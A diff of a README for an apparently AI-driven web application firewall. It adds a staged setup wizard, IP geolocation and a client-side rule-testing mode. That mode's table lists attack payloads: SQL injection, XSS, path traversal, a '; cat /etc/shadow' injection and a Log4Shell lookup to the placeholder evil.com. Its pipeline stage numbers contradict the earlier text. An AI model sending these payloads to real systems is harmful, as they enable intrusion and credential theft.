@@ -33,6 +33,9 @@
 23. [Attack Detection — In-Depth](#attack-detection--in-depth)
 24. [Future Integrations & Improvements](#future-integrations--improvements)
 25. [Conclusion](#conclusion)
+26. [Setup Wizard — Progress Tracker & Config Review](#setup-wizard--progress-tracker--config-review)
+27. [IP Geolocation — Real Lookup & Caching](#ip-geolocation--real-lookup--caching)
+28. [Safe Test Mode](#safe-test-mode)
 
 ---
 
@@ -264,24 +267,31 @@ The Protected Sites page (`/sites`) allows users to register origin servers that
 - **Copy to Clipboard** — One-click copy of the proxy URL
 - **SSL Status** — Shows SSL validity indicator
 - **Threats Blocked Counter** — Displays total blocked requests per site
-- **AI Auto-Setup with Real Site Crawling** — One-click button that invokes the `auto-setup-waf` edge function, which performs a **live HTTP crawl** of the target site to detect technologies, discover API endpoints, and extract metadata before using AI to generate tailored WAF rules, rate limits, and API monitoring configs
+- **AI Auto-Setup with Real Site Crawling** — Adding a site triggers the Setup Wizard, which performs a **live HTTP crawl** of the target site, generates tailored WAF config via AI, and presents a full crawl report + config diff for review before activation
 - **Delete Site** — Remove a site from protection
 
 ### AI Auto-Setup Flow (with Real Crawling)
 
 When a user adds a new site, the `auto-setup-waf` edge function performs a **real HTTP fetch** of the target URL before invoking the AI. This ensures all generated rules are based on actual site content, not guesses.
 
+The setup now uses a **staged preview-then-activate** flow. The edge function supports two modes:
+
+- **`preview` mode** — Crawls the site and runs AI analysis, then returns the crawl report and generated config to the frontend **without writing anything to the database**. This allows users to review, test, and approve the configuration before it goes live.
+- **`activate` mode** — Receives a previously generated config payload and writes it to the database (WAF rules, rate limits, API endpoints) and marks the site as active.
+
 ```mermaid
 sequenceDiagram
     participant U as User
     participant UI as Site Manager
+    participant WIZ as Setup Wizard
     participant EF as auto-setup-waf
     participant SITE as Target Website
     participant AI as Gemini 3 Flash
     participant DB as Database
 
     U->>UI: Add site URL
-    UI->>EF: invoke with site URL, name, ID
+    UI->>WIZ: Open Setup Wizard (progress tracker)
+    WIZ->>EF: invoke with mode="preview"
 
     Note over EF: STEP 1: Real HTTP Crawl
     EF->>SITE: HTTP GET with Deflectra-WAF-Crawler/1.0
@@ -294,16 +304,26 @@ sequenceDiagram
     EF->>AI: Send real crawl data + site context
     AI-->>EF: Structured WAF config (rules, rate limits, endpoints)
 
-    Note over EF: STEP 3: Database Insertion
-    EF->>DB: Insert WAF rules (tailored to detected stack)
-    EF->>DB: Insert rate limit rules (for discovered endpoints)
+    EF-->>WIZ: Return crawl report + config (no DB writes)
+
+    Note over WIZ: User reviews crawl report
+    Note over WIZ: User reviews config diff
+    Note over WIZ: User runs safe test mode (optional)
+
+    WIZ->>U: "Activate Protection" button
+    U->>WIZ: Click Activate
+    WIZ->>EF: invoke with mode="activate" + config payload
+
+    Note over EF: STEP 3: Database Insertion (only after user approval)
+    EF->>DB: Insert WAF rules
+    EF->>DB: Insert rate limit rules
     EF->>DB: Insert API endpoint configs
     EF->>DB: Update site status → "active"
-    EF-->>UI: Setup complete + discovered technologies
-    UI->>U: Show generated rules count + detected app type
+    EF-->>WIZ: Activation complete
+    WIZ->>U: Show success + reload sites
 ```
 
-<p align="center"><em>Figure 1: AI Auto-Setup Flow — Real HTTP crawling of the target site followed by AI-powered generation of WAF rules, rate limits, and API monitoring configs based on actual discovered content.</em></p>
+<p align="center"><em>Figure 1: AI Auto-Setup Flow — Real HTTP crawling followed by staged preview → user review → activation workflow. No database writes occur until the user explicitly approves.</em></p>
 
 ### What the Auto-Setup Crawler Discovers
 
@@ -324,7 +344,7 @@ Both AI generation features now use real HTTP crawling:
 
 | Feature | Trigger | Edge Function | What It Generates |
 |---------|---------|---------------|-------------------|
-| **Auto-Setup** | Adding a new site | `auto-setup-waf` | Full WAF config: rules + rate limits + API endpoints (saved to DB automatically) |
+| **Auto-Setup** | Adding a new site | `auto-setup-waf` | Full WAF config: rules + rate limits + API endpoints (previewed for review, then saved on user approval) |
 | **Per-Field AI** | ✨ sparkle buttons on forms | `auto-generate-fields` | Individual form fields or full form values (populated in UI for review before saving) |
 
 Both use the same crawling logic (`fetchSiteIntelligence`) and the same AI model (Google Gemini 3 Flash).
@@ -411,14 +431,15 @@ Loads all enabled rules from `waf_rules` ordered by priority:
 **Stage 7 — AI Analysis:**
 If no regex rule matched, the request is sent to **Google Gemini 3.1 Pro** for deep threat classification:
 - The AI receives the full request context: method, path, body (first 500 chars), user-agent, and source IP
-- Uses structured **tool calling** to guarantee a parseable JSON response containing: `is_threat`, `threat_type`, `severity`, `confidence`, `reason`, `source_lat`, `source_lng`, `source_country`
+- Uses structured **tool calling** to guarantee a parseable JSON response containing: `is_threat`, `threat_type`, `severity`, `confidence`, `reason`
 - The AI evaluates for 10+ threat categories: SQLi, XSS, RCE, LFI, bot abuse, rate abuse, credential stuffing, API abuse, CSRF, and malformed requests
 - Returns a confidence score (0-100%) and a human-readable explanation of why the request was flagged or allowed
 - If classified as a threat with action "blocked", the request is rejected
-- Geographic coordinates from the AI response are used for threat map visualization
+- Geographic coordinates are obtained via **real IP geolocation lookup** (see [IP Geolocation](#ip-geolocation--real-lookup--caching)), not AI estimation
 
 **Stage 8 — Logging & Response:**
 - All threats (blocked or logged) are recorded in `threat_logs` with full request metadata
+- Each threat log entry includes a `geo_source` field in the `details` JSONB column indicating whether the location data came from a verified IP lookup (`"ip-api"`) or was unavailable (`"unavailable"`)
 - Blocked requests receive the branded HTML block page (403)
 - Clean requests are forwarded to the origin server with `X-Deflectra-Verified: true` header
 
@@ -1755,3 +1776,128 @@ The application demonstrates full-stack development capabilities across:
 - **Infrastructure:** Cloudflare Workers for edge routing
 
 Deflectra is designed as a multi-tenant application where **anyone can create an account and connect their own web applications** for WAF protection. The AI-powered onboarding crawls each site in real-time, detects tech stacks and endpoints, and generates tailored security configurations automatically.
+
+---
+
+## Setup Wizard — Progress Tracker & Config Review
+
+When a user adds a new site, Deflectra opens a **Setup Wizard** that provides full transparency into the auto-configuration process. The wizard replaces the previous "fire-and-forget" auto-setup with a staged, user-controlled flow.
+
+### Phase 1: Real-Time Progress Tracker
+
+A 4-step animated progress tracker shows each stage of the setup process as it happens:
+
+| Step | Description | Visual State |
+|------|-------------|--------------|
+| 1. Crawl | Fetching site HTML and resources via live HTTP crawl | Spinner → checkmark |
+| 2. Detect | Analyzing tech stack and discovering API endpoints | Spinner → checkmark |
+| 3. AI Analysis | Gemini 3 Flash generating tailored security rules | Spinner → checkmark |
+| 4. Ready | Configuration ready for user review | Checkmark |
+
+Each step transitions from pending (dimmed) → running (spinner + "WORKING" label) → done (green checkmark) in real time.
+
+### Phase 2: Crawl Verification Report
+
+After analysis completes, the wizard displays a **crawl verification report** showing the exact data extracted from the live HTTP crawl:
+
+- **Detected Technologies** — Frameworks, databases, hosting platforms, and third-party services found in the HTML (e.g., React, Supabase, Stripe, Cloudflare)
+- **Discovered API Endpoints** — Actual API paths found in the page source (e.g., `/functions/v1/chatbot`, `/api/auth/login`)
+- **External Scripts** — All script sources loaded by the page
+- **Form Actions** — POST endpoints discovered from HTML form tags
+- **Meta Tags** — Key metadata extracted from the page head
+
+This report lets users verify that the crawler successfully analyzed their site before proceeding.
+
+### Phase 3: Configuration Diff View
+
+The wizard presents all generated security configurations in expandable, categorized sections:
+
+**WAF Rules** — Each rule shows:
+- Rule name and description
+- Severity badge (critical/high/medium/low)
+- Category label (sqli/xss/rce/lfi/bot/custom)
+- The exact regex pattern that will be used for matching
+
+**Rate Limits** — Each limit shows:
+- Rule name and target path
+- Request threshold and time window (e.g., "100/60s")
+- Action on trigger (block/challenge/throttle)
+
+**API Endpoints** — Table view showing:
+- HTTP method and path
+- Schema validation toggle
+- JWT inspection toggle
+- Rate limiting toggle
+
+Users can review every detail of the generated configuration before any data is written to the database.
+
+### Phase 4: Activation
+
+Only when the user clicks **"Activate Protection"** does the wizard send the config to the `auto-setup-waf` edge function in `activate` mode, which writes the rules, rate limits, and endpoints to the database and marks the site as active.
+
+---
+
+## IP Geolocation — Real Lookup & Caching
+
+Deflectra uses **real IP geolocation** via the ip-api.com service to determine the geographic origin of threats. This replaces the previous AI-estimated coordinates with verified location data.
+
+### How It Works
+
+1. **Real Lookup** — When the WAF proxy processes a request, it calls `http://ip-api.com/json/{ip}?fields=status,country,lat,lon` to get the actual latitude, longitude, and country for the source IP.
+
+2. **In-Memory Cache** — Results are cached in an in-memory `Map` with a **10-minute TTL** and a maximum of **2,000 entries**. Subsequent requests from the same IP skip the external API call entirely.
+
+3. **Rate Limiting** — The lookup is capped at **40 requests per minute** (ip-api.com's free tier allows 45/min). If the limit is reached, new IPs fall back to `"unavailable"` until the window resets.
+
+4. **Private IP Handling** — Private/reserved IPs (127.0.0.1, 10.x, 192.168.x, 172.x) are immediately marked as `"unavailable"` without making an API call.
+
+5. **Timeout** — Each geo lookup has a 2.5-second timeout to prevent slowing down the WAF pipeline.
+
+### Geo-Source Tracking
+
+Every threat log entry includes a `geo_source` field in its `details` JSONB column:
+
+| Value | Meaning |
+|-------|---------|
+| `"ip-api"` | Location verified via real IP geolocation API |
+| `"unavailable"` | Lookup failed, rate limited, or private/invalid IP |
+
+### UI Indicators
+
+The threat table and globe popup display visual indicators for geo-source:
+
+- **MapPin icon (cyan)** — Verified IP location from ip-api.com. Tooltip: "Verified location via IP geolocation"
+- **MapPinOff icon (muted)** — Geo data unavailable. Tooltip: "Geo data unavailable (private IP or lookup failed)"
+
+The 3D threat globe popups also show a `📍 Verified IP location` or `📍 Geo unavailable` label beneath the country name.
+
+---
+
+## Safe Test Mode
+
+The Setup Wizard includes a **Safe Test Mode** that validates generated WAF rules against sample attack payloads **without affecting real traffic**.
+
+### How It Works
+
+Test mode runs entirely **client-side** — it takes the generated regex rules and tests them against 8 pre-built attack payloads:
+
+| # | Test Payload | Attack Type |
+|---|-------------|-------------|
+| 1 | `admin' OR '1'='1' --` | SQL Injection (Login Bypass) |
+| 2 | `<script>alert(document.cookie)</script>` | XSS Script Tag |
+| 3 | `../../../etc/passwd` | Path Traversal |
+| 4 | `; cat /etc/shadow` | Remote Code Execution |
+| 5 | `' UNION SELECT username,password FROM users--` | SQL UNION Attack |
+| 6 | `<img onerror=alert(1) src=x>` | XSS Event Handler |
+| 7 | `${jndi:ldap://evil.com/exploit}` | Log4Shell |
+| 8 | `{"username":"john","email":"john@example.com"}` | Clean Request (should pass) |
+
+### Result Display
+
+Each test shows one of three outcomes:
+
+- **BLOCKED** (cyan shield icon) — The regex rule caught the payload. Shows which rule matched (e.g., "React Client-Side XSS Protection").
+- **PASSED ✓** (green checkmark) — Clean request correctly allowed through.
+- **NOT CAUGHT — needs AI layer** (orange warning) — Regex rules didn't match, but the AI Detection engine (Stage 5 of the pipeline) would evaluate this in production.
+
+A note below the results explains that regex rules are only Stage 4 of the 6-stage pipeline, and uncaught payloads are still evaluated by the Gemini AI in production.
